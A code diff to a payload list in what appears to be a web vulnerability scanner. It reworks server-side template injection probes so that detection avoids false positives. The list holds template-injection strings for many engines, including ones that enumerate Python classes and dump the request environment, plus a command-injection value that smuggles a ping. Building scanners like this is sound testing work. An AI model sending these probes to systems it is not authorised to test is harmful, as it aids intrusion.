@@ -150,18 +150,19 @@ const BS_PAYLOADS = {
     '; ping -c 5 127.0.0.1',
   ],
 
-  // ── SSTI (77 for wider engine coverage; 7*7 kept for cross-check) ─────────
+  // ── SSTI (8*9 → 72: the evaluated result NEVER appears in the payload, so a
+  // plain reflection can never false-positive; 7*7 → 49 kept as cross-check) ─
   SSTI: [
-    '{{77}}',
-    '#{77}',
-    '<%=77%>',
-    '{77}',
-    '{{=77}}',
-    '{=77}',
-    '@{77}',
-    '@(77)',
-    '${77}',
-    '${{77}}',
+    '{{8*9}}',
+    '#{8*9}',
+    '<%=8*9%>',
+    '{8*9}',
+    '{{=8*9}}',
+    '{=8*9}',
+    '@{8*9}',
+    '@(8*9)',
+    '${8*9}',
+    '${{8*9}}',
     '${{<%[%\'"}}%.',
     '{{7*7}}',
     '${7*7}',
@@ -170,7 +171,7 @@ const BS_PAYLOADS = {
     '{{self}}',
     '{{[].__class__.__base__.__subclasses__()}}',
     '{{request.environ}}',
-    '%7B%7B77%7D%7D',
+    '%7B%7B8*9%7D%7D',
   ],
 
   // ── SSRF ──────────────────────────────────────────────────────────────────
